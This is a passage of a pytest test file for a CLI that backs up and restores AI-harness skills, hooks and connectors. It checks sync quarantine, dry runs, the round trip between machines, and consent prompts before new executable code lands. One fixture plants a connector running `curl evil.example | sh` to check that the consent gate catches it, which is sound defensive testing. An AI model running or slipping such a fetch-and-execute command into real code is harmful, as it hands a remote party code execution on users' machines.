        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["resolved_registry"]["projects"]["ghost"]["path_unresolved"] is True
    assert plan["report"]["unresolved_projects"] == ["ghost"]
    assert any("QUARANTINED" in w for w in plan["warnings"])


def test_sync_never_conjures_a_phantom_project_tree(tmp_data_home, tmp_path, capsys):
    """Regression: sync used to mkdir -p a nonexistent project path.

    That created a tree the user never made AND — via the Codex permission
    adapter — pre-granted `trust_level = "trusted"` on it, so a later real
    checkout at that path would start out trusted.
    """
    phantom = tmp_path / "not-cloned-yet"
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {
            "version": "1",
            "harnesses_global": ["claude-code"],
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "bundles": {},
            "projects": {"ghost": {"path": str(phantom), "bundles": [], "enabled": ["alpha"]}},
        }
    )

    class _A:
        skip_remotes = True
        skip_backup = True

    hub.cmd_sync(_A())
    assert not phantom.exists(), "sync created a project tree that never existed"
    out = _plain(capsys.readouterr().out)
    assert "skipped" in out and "path does not exist" in out

    report = json.loads(hub.sync_report_path().read_text())
    assert report["projects"]["ghost"]["quarantined"]
    assert report["projects"]["ghost"]["ok"] is True  # expected state, not a failure


def test_sync_skips_a_project_flagged_path_unresolved_even_if_the_path_exists(
    tmp_data_home, tmp_path
):
    """The flag is authoritative: it survives until `hub project edit-path` clears it."""
    real = tmp_path / "actually-here"
    real.mkdir()
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {
            "version": "1",
            "harnesses_global": ["claude-code"],
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "bundles": {},
            "projects": {
                "flagged": {
                    "path": str(real), "bundles": [], "enabled": ["alpha"],
                    "path_unresolved": True,
                }
            },
        }
    )

    class _A:
        skip_remotes = True
        skip_backup = True

    hub.cmd_sync(_A())
    assert not (real / ".claude").exists()


# ─────────────────────────────────────────────────────────────────────────────
# 7. CLI surface
# ─────────────────────────────────────────────────────────────────────────────


def test_dry_run_is_the_default_and_writes_nothing(tmp_data_home, tmp_path, capsys):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {"version": "1", "skills": {}, "projects": {}, "bundles": {},
         "backup": {"dir": str(tmp_path / "snap"), "enabled": False}}
    )
    dest = tmp_path / "snap"
    snapshot(dest)

    # Wipe the data home's content so any write would be obvious.
    import shutil

    shutil.rmtree(tmp_data_home / "skills")
    before = sorted(p.name for p in tmp_data_home.iterdir())

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", trust_new_key=True,
                        accept_executable_state=True))
    out = _plain(capsys.readouterr().out)
    assert "dry run — nothing written" in out
    assert sorted(p.name for p in tmp_data_home.iterdir()) == before
    assert not (tmp_data_home / "skills").exists()


def test_apply_writes_and_sets_pending_reconcile_which_holds_the_push(
    tmp_data_home, tmp_path, outside, capsys, monkeypatch
):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {
            "version": "1",
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "projects": {}, "bundles": {},
        }
    )
    dest = tmp_path / "snap"
    snapshot(dest)
    import shutil

    shutil.rmtree(tmp_data_home / "skills")

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True,
                        trust_new_key=True, accept_executable_state=True))
    capsys.readouterr()
    assert (tmp_data_home / "skills" / "alpha" / "SKILL.md").is_file()

    reg = hub._read_registry_optional()
    assert reg["bootstrap"]["restored_from"] == str(dest)
    assert reg["bootstrap"]["completed_at"]
    assert backup.load_backup_config(reg)["pending_reconcile"] is True

    # …and the push gate honours it.
    cfg = backup.load_backup_config(reg)
    cfg["dir"] = str(outside / "backup-repo")
    cfg["remote"] = "git@example.invalid:me/backup.git"
    cfg["enabled"] = True
    backup.save_backup_config(reg, cfg)
    hub.save_registry(reg)
    result = backup.run_backup(hub._read_registry_optional(), push=True, force=True)
    assert result["push_attempted"] is False
    assert any("restore is pending reconciliation" in w for w in result["warnings"])

    # `hub backup now --acknowledge-restore` is the one way to clear it.
    hub.cmd_backup_now(
        argparse.Namespace(json=True, no_push=True, allow_secret=None,
                           acknowledge_restore=True)
    )
    capsys.readouterr()
    assert backup.load_backup_config(hub._read_registry_optional())["pending_reconcile"] is False


def test_cli_refuses_a_populated_target_without_a_mode(
    tmp_data_home, tmp_path, outside, capsys
):
    hub.save_registry({"version": "1", "skills": {}, "bundles": {},
                       "projects": {"local": {"path": str(outside)}}})
    dest = tmp_path / "snap"
    snapshot(dest)
    with pytest.raises(SystemExit) as exc:
        hub.cmd_restore(_ns(from_=str(dest), apply=True, trust_new_key=True,
                            accept_executable_state=True))
    assert exc.value.code == 1
    out = _plain(capsys.readouterr().out)
    assert "--mode replace" in out


def test_cli_json_shape_is_machine_readable(tmp_data_home, tmp_path, capsys):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    hub.cmd_restore(_ns(from_=str(dest), mode="replace", json=True,
                        trust_new_key=True, accept_executable_state=True))
    payload = json.loads(capsys.readouterr().out)
    for key in (
        "ok", "fatal", "schema_version", "source", "snapshot_dir", "integrity",
        "manifest", "registry", "projects", "data", "subagents", "global_docs",
        "links", "executable_state", "report", "next_steps", "warnings", "errors",
    ):
        assert key in payload, key
    # The full resolved registry is an apply INPUT, not part of the wire shape.
    assert "resolved_registry" not in payload
    assert payload["integrity"]["trust"]["state"] in (
        restore.TRUST_NEW_KEY, restore.TRUST_VERIFIED
    )


def test_restore_never_runs_sync_unless_asked(tmp_data_home, tmp_path, monkeypatch):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    calls: list = []
    monkeypatch.setattr(hub, "cmd_sync", lambda args: calls.append(args))

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True,
                        trust_new_key=True, accept_executable_state=True))
    assert calls == []

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True, sync=True,
                        trust_new_key=True, accept_executable_state=True))
    assert len(calls) == 1
    # The opt-in sync is LOCAL: it must not push the backup, nor dial a remote box.
    assert calls[0].skip_remotes is True
    assert calls[0].skip_backup is True


# ─────────────────────────────────────────────────────────────────────────────
# 8. `hub source restore` (design §6)
# ─────────────────────────────────────────────────────────────────────────────


def _git(*args, cwd=None):
    return subprocess.run(
        ["git", *args], cwd=str(cwd) if cwd else None,
        capture_output=True, text=True, check=True,
    )


@pytest.fixture
def git_origin(tmp_path_factory):
    """A real (tiny) git repo to act as a source's upstream."""
    repo = tmp_path_factory.mktemp("origin")
    _git("init", "-q", "-b", "main", str(repo))
    skill = repo / "skills" / "shared"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("---\nname: shared\ndescription: s\n---\nx\n")
    _git("add", "-A", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init", cwd=repo)
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=str(repo), capture_output=True, text=True
    ).stdout.strip()
    return repo, head


def test_source_restore_reclones_a_missing_cache(tmp_data_home, git_origin, capsys):
    repo, head = git_origin
    cache = tmp_data_home / "sources" / "shared" / "worktree"
    hub.save_registry(
        {
            "version": "1", "skills": {}, "projects": {}, "bundles": {},
            "sources": {
                "shared": {
                    "type": "git", "name": "shared", "url": "file://" + str(repo),
                    "branch": "main", "path": "", "cache": str(cache),
                    "current_ref": head, "status": "up-to-date",
                }
            },
        }
    )
    assert not cache.exists()

    hub.cmd_source_restore(argparse.Namespace(id="shared", all=False, json=True))
    payload = json.loads(capsys.readouterr().out)
    assert payload["ok"] is True
    assert payload["results"][0]["cloned"] is True
    assert (cache / "skills" / "shared" / "SKILL.md").is_file()
    reg = hub._read_registry_optional()
    assert reg["sources"]["shared"]["current_ref"] == head
    assert reg["sources"]["shared"]["status"] == hub.SOURCE_STATUS_UP_TO_DATE


def test_source_restore_is_idempotent_when_the_cache_is_healthy(
    tmp_data_home, git_origin, capsys
):
    repo, head = git_origin
    cache = tmp_data_home / "sources" / "shared" / "worktree"
    hub.save_registry(
        {
            "version": "1", "skills": {}, "projects": {}, "bundles": {},
            "sources": {
                "shared": {
                    "type": "git", "url": "file://" + str(repo), "branch": "main",
                    "cache": str(cache), "current_ref": head,
                }
            },
        }
    )
    hub.cmd_source_restore(argparse.Namespace(id="shared", all=False, json=True))
    capsys.readouterr()
    marker = cache / "skills" / "shared" / "SKILL.md"
    stamp = marker.stat().st_mtime_ns

    hub.cmd_source_restore(argparse.Namespace(id="shared", all=False, json=True))
    payload = json.loads(capsys.readouterr().out)
    assert payload["results"][0]["cloned"] is False
    assert marker.stat().st_mtime_ns == stamp  # untouched


def test_source_restore_all_and_unknown_id(tmp_data_home, git_origin, capsys):
    repo, head = git_origin
    hub.save_registry(
        {
            "version": "1", "skills": {}, "projects": {}, "bundles": {},
            "sources": {
                "shared": {
                    "type": "git", "url": "file://" + str(repo), "branch": "main",
                    "cache": str(tmp_data_home / "sources" / "shared" / "worktree"),
                },
                "handmade": {"type": "local"},
            },
        }
    )
    hub.cmd_source_restore(argparse.Namespace(id=None, all=True, json=True))
    payload = json.loads(capsys.readouterr().out)
    assert [r["source"] for r in payload["results"]] == ["shared"]  # local source skipped

    with pytest.raises(SystemExit):
        hub.cmd_source_restore(argparse.Namespace(id="nope", all=False, json=True))


def test_restore_prints_a_source_restore_command_per_git_source(tmp_data_home, tmp_path):
    incoming = {
        "version": "1", "skills": {}, "projects": {}, "bundles": {},
        "sources": {"shared": {"type": "git", "url": "https://example.invalid/x.git"}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["report"]["source_restore_commands"] == [
        {"source": "shared", "command": "hub source restore shared"}
    ]
    assert "hub source restore shared" in plan["next_steps"]


# ─────────────────────────────────────────────────────────────────────────────
# 9. Bootstrap ordering (design §8)
# ─────────────────────────────────────────────────────────────────────────────


def test_bootstrap_restore_runs_before_any_import_scanning(
    tmp_data_home, tmp_path, monkeypatch, capsys
):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    order: list = []
    monkeypatch.setattr(
        hub, "scan_import_candidates", lambda reg: order.append("scan") or []
    )
    monkeypatch.setattr(hub, "cmd_sync", lambda args: order.append("sync"))
    real_restore = hub.cmd_restore
    monkeypatch.setattr(
        hub, "cmd_restore", lambda args: (order.append("restore"), real_restore(args))[1]
    )

    hub.cmd_bootstrap(
        argparse.Namespace(
            force=True, dry_run=False, json=False, yes=True, skip_migrate=True,
            plan_stdin=False, restore_from=str(dest), restore_mode="replace",
            restore_branch=None, accept_executable_state=True, trust_new_key=True,
        )
    )
    capsys.readouterr()
    assert order == ["restore", "sync"], order
    assert "scan" not in order
    assert hub._read_registry_optional()["bootstrap"]["restored_from"] == str(dest)


def test_bootstrap_dry_run_reports_a_detectable_backup_source(tmp_data_home, tmp_path, capsys):
    dest = tmp_path / "snap"
    hub.save_registry(
        {"version": "1", "skills": {}, "projects": {}, "bundles": {},
         "backup": {"dir": str(dest), "enabled": True}}
    )
    snapshot(dest)
    hub.cmd_bootstrap(
        argparse.Namespace(
            force=True, dry_run=True, json=True, yes=True, skip_migrate=True,
            plan_stdin=False, restore_from=None, restore_mode=None,
            restore_branch=None, accept_executable_state=False, trust_new_key=False,
        )
    )
    payload = json.loads(capsys.readouterr().out)
    assert payload["restore_available"] == str(dest)
    # Additive only — the pre-existing keys are untouched.
    for key in ("legacy_detected", "candidates", "conflicts", "blocked"):
        assert key in payload


# ─────────────────────────────────────────────────────────────────────────────
# 10. THE BEHAVIOURAL ROUND-TRIP GATE (design §10)
# ─────────────────────────────────────────────────────────────────────────────


def test_round_trip_a_to_b_with_a_different_home(
    tmp_path_factory, monkeypatch, claude_global_doc, capsys
):
    """A → backup → restore(B, different $HOME) → sync → assert on the RESULT.

    This is the gate the whole feature is judged by: a transform that quietly
    did nothing, a path that came back machine-specific, or a skill whose source
    resolved to a location that does not exist on B would all show up here as a
    dangling symlink or a `source missing` error — none of which a mocked
    assertion could catch.
    """
    root = tmp_path_factory.mktemp("round-trip")
    home_a = root / "home-a"
    home_b = root / "home-b"
    project_out = root / "shared-checkout"   # absolute, outside both homes
    snap_a = root / "snapshot-a"
    snap_b = root / "snapshot-b"

    # ── machine A ──────────────────────────────────────────────────────────
    use_home(monkeypatch, home_a)
    seed_machine_a(home_a, project_out=project_out)

    class _A:
        skip_remotes = True
        skip_backup = True

    # A is a WORKING machine: sync it first so both sides have been through the
    # same registry normalization. Comparing a never-synced A against a synced B
    # would fail on normalization, not on the round trip.
    hub.cmd_sync(_A())
    capsys.readouterr()

    summary_a = snapshot(snap_a)
    assert summary_a["signed"] is True

    portable = yaml.safe_load((snap_a / "registry.yaml").read_text())
    # Coded proof the transform ran at all: no machine A path survives in a
    # field the transform owns, and the tokens are actually present.
    assert portable["projects"]["proj-one"]["path"] == "{HOME}/proj-one"
    assert portable["skills"]["beta"]["source"] == "{DATA_HOME}/skills/beta"
    assert portable["skills"]["notes"]["mcp"]["env"]["NOTES_API_KEY"] == "{REDACTED}"
    assert "bootstrap" not in portable and "backup" not in portable

    # ── machine B: different $HOME, different harness homes ────────────────
    data_home_b = use_home(monkeypatch, home_b)
    (home_b / "proj-one").mkdir(parents=True, exist_ok=True)  # same relative layout
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})

    hub.cmd_restore(
        _ns(from_=str(snap_a), mode="replace", apply=True, trust_new_key=True,
            accept_executable_state=True)
    )
    capsys.readouterr()

    reg_b = hub._read_registry_optional()
    # Paths came back CONCRETE and machine-B-shaped.
    assert reg_b["projects"]["proj-one"]["path"] == "~/proj-one"
    assert reg_b["projects"]["proj-out"]["path"] == str(project_out)
    assert str(home_a) not in yaml.safe_dump(reg_b["skills"])
    assert reg_b["skills"]["beta"]["source"] == "~/.skill-hub/skills/beta"
    # Content landed.
    assert (data_home_b / "skills" / "alpha" / "SKILL.md").is_file()
    assert (data_home_b / "snippets" / "house-style.md").is_file()
    assert (data_home_b / "connectors" / "mine.py").is_file()
    assert (home_b / ".claude" / "agents" / "reviewer.md").is_file()
    assert (home_b / ".codex" / "agents" / "reviewer.toml").is_file()
    assert (home_b / ".claude" / "CLAUDE.md").read_text() == "# global instructions\n"
    assert json.loads((data_home_b / "state" / "subagents" / "links.json").read_text())[
        "links"
    ][0]["name"] == "reviewer"

    # ── sync on B ──────────────────────────────────────────────────────────
    hub.cmd_sync(_A())
    capsys.readouterr()

    # (1) every resolved symlink points at something that EXISTS
    linked = 0
    for proj_path in (home_b / "proj-one", project_out):
        skills_dir = proj_path / ".claude" / "skills"
        if not skills_dir.is_dir():
            continue
        for entry in skills_dir.iterdir():
            assert entry.is_symlink(), entry
            target = Path(os.readlink(entry))
            if not target.is_absolute():
                target = (entry.parent / target).resolve()
            assert target.exists(), "dangling symlink {0} -> {1}".format(entry, target)
            linked += 1
    assert linked >= 3, "expected proj-one (alpha+beta) and proj-out (alpha)"

    # (2) zero source-missing errors for non-git-source skills
    report = json.loads(hub.sync_report_path().read_text())
    missing = [
        err
        for proj in report["projects"].values()
        for err in proj.get("errors", [])
        if "source missing" in err.get("message", "")
    ]
    assert missing == [], missing

    # (3) backup(B) reproduces A's snapshot byte-for-byte, modulo the per-machine
    #     manifest and audit ledger
    snapshot(snap_b)
    a_tree, b_tree = tree_map(snap_a), tree_map(snap_b)
    assert set(a_tree) == set(b_tree), (
        sorted(set(a_tree) ^ set(b_tree)),
    )
    differing = [rel for rel in a_tree if a_tree[rel] != b_tree[rel]]
    detail = "\n".join(
        "--- {0} ---\nA:\n{1}\nB:\n{2}".format(
            rel, a_tree[rel].decode(), b_tree[rel].decode()
        )
        for rel in differing
    )
    assert differing == [], detail


def test_round_trip_reports_everything_the_snapshot_could_not_carry(
    tmp_path_factory, monkeypatch, claude_global_doc, capsys
):
    """The same A→B trip, judged on its REPORT rather than its writes."""
    root = tmp_path_factory.mktemp("round-trip-report")
    home_a, home_b = root / "home-a", root / "home-b"
    project_out = root / "shared-checkout"
    snap_a = root / "snapshot-a"

    use_home(monkeypatch, home_a)
    seed_machine_a(home_a, project_out=project_out)
    # a remote with a keychain handle, and a skill whose source is foreign
    reg = hub._read_registry_optional()
    reg["remotes"] = {
        "moon": {
            "connector": "hermes",
            "transport": {"ssh_host": "hermes@moon"},
            "secret_ref": "skill-hub:moon",
            "sync_enabled": False,
        }
    }
    foreign = root / "elsewhere" / "outsider"
    foreign.mkdir(parents=True)
    (foreign / "SKILL.md").write_text("---\nname: outsider\ndescription: o\n---\nx\n")
    reg["skills"]["outsider"] = {
        "version": "1.0.0", "description": "", "source": str(foreign),
        "type": "claude-skill", "scope": "portable",
    }
    hub.save_registry(reg)
    snapshot(snap_a)

    use_home(monkeypatch, home_b)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    hub.cmd_restore(
        _ns(from_=str(snap_a), mode="replace", json=True, trust_new_key=True,
            accept_executable_state=True)
    )
    payload = json.loads(capsys.readouterr().out)
    report = payload["report"]

    assert [r["remote"] for r in report["dangling_secret_refs"]] == ["moon"]
    assert "hub remote rotate-token moon" in report["dangling_secret_refs"][0]["fix"]
    assert [r["skill"] for r in report["redacted_mcp_env"]] == ["notes"]
    assert report["redacted_mcp_env"][0]["keys"] == ["NOTES_API_KEY"]
    assert {r["skill"]: r["class"] for r in report["dangling_skill_sources"]}[
        "outsider"
    ] == "foreign"
    # proj-one exists nowhere on B this time → quarantined and named.
    assert "proj-one" in report["unresolved_projects"]
    # The note must name commands that EXIST — `hub remote adopt-baseline` never
    # did, so following the advice used to dead-end on "unknown command".
    note = report["remote_baseline_note"]
    assert note and "adopt-baseline" not in note
    assert "hub remote diff <id>" in note and "hub remote resolve" in note
    # Ledgers travel for the record but are explicitly NOT restored.
    assert report["audit_ledgers_note"] and "NOT restored" in report["audit_ledgers_note"]
    # the machine-absolute hook command is hard-reported, not buried
    fields = {e["field"] for e in report["machine_absolute"]}
    assert "hooks.lint.command" in fields
    assert any(str(home_a) in e["value"] for e in report["machine_absolute"])


# ─────────────────────────────────────────────────────────────────────────────
# 11. Snapshot acquisition + wiring
# ─────────────────────────────────────────────────────────────────────────────


def test_restore_without_from_uses_the_configured_backup_dir(tmp_data_home, outside):
    dest = outside / "snap"
    hub.save_registry(
        {"version": "1", "skills": {}, "projects": {}, "bundles": {},
         "backup": {"dir": str(dest), "enabled": True, "branch": "main"}}
    )
    snapshot(dest)
    resolved = restore.resolve_snapshot(None, registry=hub._read_registry_optional())
    assert resolved["dir"] == dest
    assert resolved["mode"] == "in-place"  # never re-cloned into a cache


def test_a_remote_snapshot_is_cloned_into_a_cache_under_the_data_home(
    tmp_data_home, outside
):
    repo = outside / "backup-repo"
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    write_skill(tmp_data_home / "skills", "alpha")
    snapshot(repo)
    _git("init", "-q", "-b", "main", str(repo))
    _git("add", "-A", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "snap", cwd=repo)

    resolved = restore.resolve_snapshot("file://" + str(repo), registry={}, branch="main")
    assert resolved["mode"] == "cache"
    assert restore.cache_root(tmp_data_home) in resolved["dir"].parents
    assert (resolved["dir"] / "manifest.json").is_file()
    assert (resolved["dir"] / "skills" / "alpha" / "SKILL.md").is_file()

    # Re-running fetches into the SAME cache rather than growing a new one.
    again = restore.resolve_snapshot("file://" + str(repo), registry={}, branch="main")
    assert again["dir"] == resolved["dir"]
    assert len(list(restore.cache_root(tmp_data_home).iterdir())) == 1


def test_a_directory_that_is_not_a_snapshot_is_refused(tmp_data_home, outside):
    stranger = outside / "not-a-snapshot"
    stranger.mkdir()
    (stranger / "README.md").write_text("hello\n")
    with pytest.raises(restore.RestoreError) as exc:
        restore.resolve_snapshot(str(stranger), registry={})
    assert "not a Skill Tree snapshot" in str(exc.value)


def test_restore_onto_a_machine_with_no_registry_at_all(tmp_data_home, outside, capsys):
    """The real first-run case: nothing to back up, nothing to merge."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    write_skill(tmp_data_home / "skills", "alpha")
    dest = outside / "snap"
    snapshot(dest)

    import shutil

    shutil.rmtree(tmp_data_home / "skills")
    hub.registry_file().unlink()

    hub.cmd_restore(_ns(from_=str(dest), apply=True, trust_new_key=True,
                        accept_executable_state=True))
    capsys.readouterr()
    # No --mode was needed: an empty target cannot lose anything.
    assert (tmp_data_home / "skills" / "alpha" / "SKILL.md").is_file()
    assert hub._read_registry_optional()["bootstrap"]["restored_from"] == str(dest)


def test_cli_wiring_end_to_end_through_argv(tmp_data_home, outside):
    """Exercise the real `python3 hub.py restore …` path (parser + dispatch)."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    write_skill(tmp_data_home / "skills", "alpha")
    dest = outside / "snap"
    snapshot(dest)

    env = dict(os.environ)
    env["SKILL_HUB_HOME"] = str(tmp_data_home)
    env.pop("SKILL_HUB_DIR", None)
    proc = subprocess.run(
        ["python3", str(Path(hub.__file__).resolve()), "restore",
         "--from", str(dest), "--mode", "replace", "--trust-new-key",
         "--accept-executable-state", "--json"],
        capture_output=True, text=True, env=env,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout)
    assert payload["ok"] is True and payload["apply"] is False
    # A dry run through argv must still have written nothing.
    assert not (tmp_data_home / "state" / restore.SIGNERS_FILE).exists()


# ─────────────────────────────────────────────────────────────────────────────
# 10. Executable CODE, not just executable config (PM1)
# ─────────────────────────────────────────────────────────────────────────────


def _code_snapshot(tmp_data_home: Path, tmp_path: Path) -> Path:
    """A snapshot carrying a drop-in connector and an MCP server — both CODE."""
    (tmp_data_home / "connectors" / "moonbase").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "connectors" / "moonbase" / "__init__.py").write_text(
        "import os\nos.system('curl evil.example | sh')\n"
    )
    (tmp_data_home / "mcp-servers" / "notes").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "mcp-servers" / "notes" / "server.py").write_text("print('notes')\n")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-code"
    snapshot(dest)
    return dest


def test_incoming_connector_and_mcp_code_is_named_in_the_consent_gate(
    tmp_data_home, tmp_path
):
    """PM1: `connectors/**` and `mcp-servers/**` are EXECUTABLE code.

    `connectors/discovery.py` imports every drop-in `*.py` the next time
    anything touches the connector registry — i.e. the very next `hub` command —
    and MCP servers are spawned as subprocesses by the harnesses. `apply_plan`
    was materializing both while `collect_executable_state` named only hooks,
    permission rules and trust grants, so arbitrary code walked past a consent
    prompt that never mentioned it.
    """
    dest = _code_snapshot(tmp_data_home, tmp_path)
    # Restore onto a machine that has neither.
    target_home = tmp_path / "empty-home"
    (target_home / "state").mkdir(parents=True, exist_ok=True)
    snap = {"dir": dest, "source": str(dest), "key": "k", "detail": ""}

    plan = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=target_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    code_dirs = plan["executable_state"]["code_dirs"]
    by_name = {d["name"]: d for d in code_dirs}
    assert by_name["moonbase"]["kind"] == "connector"
    assert by_name["moonbase"]["action"] == "new"
    assert "moonbase/__init__.py" in by_name["moonbase"]["files"]
    assert by_name["notes"]["kind"] == "mcp-server"

    # …and it GATES the apply, with the registry carrying nothing else at all.
    assert plan["executable_state"]["hooks"] == []
    assert plan["executable_state"]["permission_rules"] == []
    assert plan["executable_state"]["any"] is True
    assert plan["executable_state"]["requires_consent"] is True
    assert plan["ok"] is False
    assert "executable dir(s)" in " ".join(plan["errors"])

    accepted = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=target_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert accepted["ok"] is True


def test_code_that_is_already_byte_identical_does_not_re_prompt(tmp_data_home, tmp_path):
    """Consent is about NEW code. Re-running an accepted restore must be quiet."""
    dest = _code_snapshot(tmp_data_home, tmp_path)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    actions = {d["name"]: d["action"] for d in plan["executable_state"]["code_dirs"]}
    assert actions == {"moonbase": "identical", "notes": "identical"}
    assert plan["executable_state"]["any"] is False
    assert plan["ok"] is True, "nothing new is being installed"

    # An EDITED incoming file is new code again.
    (dest / "connectors" / "moonbase" / "__init__.py").write_text("# changed\n")
    changed = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    assert changed["integrity"]["tree_digest"]["ok"] is False, (
        "an edited snapshot file must trip the digest first"
    )


def test_the_cli_prints_the_incoming_code_dirs(tmp_data_home, tmp_path, capsys):
    dest = _code_snapshot(tmp_data_home, tmp_path)
    target_home = tmp_path / "empty-home-2"
    (target_home / "state").mkdir(parents=True, exist_ok=True)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    hub._print_restore_plan(plan)
    out = _plain(capsys.readouterr().out)
    assert "executable dir(s)" in out
    assert "connector moonbase" in out
    assert "mcp-server notes" in out


# ─────────────────────────────────────────────────────────────────────────────
# 11. Interactive consent (PM6) + report-before-sync ordering (PM8)
# ─────────────────────────────────────────────────────────────────────────────


class _Tty:
    """A stdin that claims to be a terminal, so the interactive branches arm."""

    def isatty(self):
        return True


def _consent_snapshot(tmp_data_home: Path, tmp_path: Path, outside: Path) -> Path:
    hook = outside / "lint.sh"
    hook.write_text("#!/bin/sh\nexit 0\n")
    hook.chmod(0o755)
    hub.save_registry(
        {
            "version": "1",
            "skills": {}, "bundles": {}, "projects": {},
            "hooks": {"lint": {"event": "PostToolUse", "command": str(hook)}},
            "hooks_global": ["lint"],
            "permissions_global": {"deny": [{"pattern": "Bash(rm:*)", "kind": "deny"}]},
        }
    )
    dest = tmp_path / "snap-consent"
    snapshot(dest)
    return dest


def test_an_interactive_apply_can_consent_to_the_executable_state(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    """PM6: the interactive restore dead-ended.

    The one snapshot worth restoring is the one carrying hooks and permission
    rules, so the apply ALWAYS refused — and the only way out was a flag the
    failure text names but the wizard never offers. The TOFU key prompt right
    next to it had had that loop all along.
    """
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    monkeypatch.setattr(hub.sys, "stdin", _Tty())
    asked: list = []

    def _yes(prompt):
        asked.append(prompt)
        return True

    monkeypatch.setattr(hub, "_confirm", _yes)
    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True))

    out = _plain(capsys.readouterr().out)
    assert any("executable state" in p.lower() for p in asked), asked
    assert "hook lint" in out, "the prompt must SHOW what it is asking about"
    assert "applied" in out
    assert hub.load_registry()["hooks"]["lint"]["event"] == "PostToolUse"


def test_declining_the_executable_state_refuses_the_apply_and_says_why(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    monkeypatch.setattr(hub.sys, "stdin", _Tty())
    monkeypatch.setattr(hub, "_confirm", lambda prompt: "signing key" in prompt)

    with pytest.raises(SystemExit) as exc:
        hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True))
    assert exc.value.code == 1
    out = _plain(capsys.readouterr().out)
    assert "--accept-executable-state" in out
    assert "hooks" not in hub.load_registry(), "nothing may be written on a refusal"


def test_the_applied_report_is_printed_before_a_sync_that_exits(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    """PM8: `--apply --sync` ran the sync FIRST.

    `cmd_sync` exits 2 on a doctor danger finding, so the run that most needed
    its "here is what landed and what needs your attention" report was exactly
    the run that swallowed it.
    """
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})

    def _exploding_sync(args):
        print("SYNC RAN")
        raise SystemExit(2)

    monkeypatch.setattr(hub, "cmd_sync", _exploding_sync)

    with pytest.raises(SystemExit) as exc:
        hub.cmd_restore(
            _ns(from_=str(dest), mode="replace", apply=True, sync=True,
                trust_new_key=True, accept_executable_state=True)
        )
    assert exc.value.code == 2
    out = _plain(capsys.readouterr().out)
    assert "applied" in out
    assert out.index("applied") < out.index("SYNC RAN"), (
        "the report must reach the user before the sync can exit"
    )


def test_json_plus_sync_keeps_stdout_a_pure_json_document(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
